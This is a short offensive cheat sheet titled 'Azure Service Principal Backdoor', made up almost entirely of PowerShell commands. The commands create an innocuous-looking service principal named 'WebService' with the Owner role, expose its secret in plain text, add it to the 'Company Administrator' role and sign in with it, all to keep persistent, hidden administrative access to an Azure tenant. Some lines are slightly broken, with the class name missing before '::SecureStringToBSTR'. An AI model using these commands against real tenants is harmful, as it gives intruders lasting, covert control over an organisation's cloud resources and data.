# Azure Service Principal Backdoor

## Tool: Az Powershell Module

### Create a new Azure service principal as a backdoor

    $spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner

    $spn

    $BSTR = ::SecureStringToBSTR($spn.Secret)

    $UnsecureSecret = ::PtrToStringAuto($BSTR)

    $UnsecureSecret

    $sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>

    $role = Get-MsolRole -RoleName "Company Administrator"

    Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId

### Enter the AppID as username and what was returned for $UnsecureSecret as the password in the Get-Credential prompt

    $cred = Get-Credential

    Connect-AzAccount -Credential $cred -Tenant “tenant ID" -ServicePrincipal
